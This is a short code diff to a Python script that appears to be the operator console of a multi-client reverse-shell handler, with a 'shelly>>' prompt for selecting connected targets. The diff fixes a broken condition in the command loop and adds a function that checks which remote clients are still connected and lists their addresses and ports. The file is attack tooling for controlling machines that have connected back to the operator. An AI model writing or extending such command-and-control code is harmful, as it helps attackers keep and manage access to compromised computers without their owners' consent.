@@ -89,7 +89,7 @@ def accept_connections():
 def start_shelly():
     while True:
         cmd = input('shelly>> ')
-        if == 'list':
+        if cmd == 'list':
             list_connections()
         elif 'select' in cmd:
             conn = get_target(cmd)
@@ -98,6 +98,21 @@ def start_shelly():
         else:
             print("Command not recognized")
 
+# Display all current connections
+
+
+def list_connections():
+    results = ''
+    for i, conn in enumerate(all_connections):
+        try:
+            conn.send(str.encode(' '))
+            conn.recv(20480)
+        except:
+            del all_connections[i]
+            del all_addresses[i]
+            continue
+        results += str(i) + '   ' + str(all_addresses[i][0]) + '   ' + str(all_addresses[i][1]) + '\n'
+    print('------ Clients ------' + '\n' + results)
 
 def main():
     socket_create()
